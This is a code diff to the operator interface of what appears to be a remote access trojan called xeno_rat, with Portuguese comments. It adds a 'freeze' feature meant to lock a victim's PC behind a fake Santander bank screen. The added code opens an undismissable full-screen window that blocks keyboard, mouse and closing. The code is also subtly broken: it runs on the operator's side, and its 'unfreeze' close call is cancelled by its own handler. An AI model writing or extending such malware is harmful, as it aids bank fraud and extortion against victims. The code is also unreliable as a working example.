@@ -44,14 +44,41 @@ namespace xeno_rat_server.Forms
         {
             // Implementar a funcionalidade de travamento
             // Exibir uma tela falsa do banco e bloquear o PC da vítima
-            client.SendAsync(new byte[] { /* código para travar */ });
+            // Exibir uma tela falsa do banco e bloquear o PC da vítima
+            var lockScreenForm = new LockScreenForm();
+            lockScreenForm.Show();
+            lockScreenForm.BringToFront();
+            lockScreenForm.TopMost = true;
+            lockScreenForm.FormBorderStyle = FormBorderStyle.None;
+            lockScreenForm.WindowState = FormWindowState.Maximized;
+            lockScreenForm.BackColor = Color.White;
+            lockScreenForm.BackgroundImage = Image.FromFile("santander_fake_page.png");
+            lockScreenForm.BackgroundImageLayout = ImageLayout.Stretch;
+            lockScreenForm.ShowInTaskbar = false;
+            lockScreenForm.ControlBox = false;
+            lockScreenForm.Text = string.Empty;
+            lockScreenForm.Enabled = false;
+            lockScreenForm.KeyDown += (s, ev) => ev.Handled = true;
+            lockScreenForm.MouseDown += (s, ev) => ev.Handled = true;
+            lockScreenForm.MouseMove += (s, ev) => ev.Handled = true;
+            lockScreenForm.MouseUp += (s, ev) => ev.Handled = true;
+            lockScreenForm.FormClosing += (s, ev) => ev.Cancel = true;
+            lockScreenForm.Show();
         }
 
         private void buttonUnfreezeSantander_Click(object sender, EventArgs e)
         {
             // Implementar a funcionalidade de destravamento
             // Restaurar o PC da vítima ao normal
-            client.SendAsync(new byte[] { /* código para destravar */ });
+            // Restaurar o PC da vítima ao normal
+            foreach (Form form in Application.OpenForms)
+            {
+                if (form is LockScreenForm)
+                {
+                    form.Close();
+                    break;
+                }
+            }
         }
         public void TempOnDisconnect(Node node)
         {
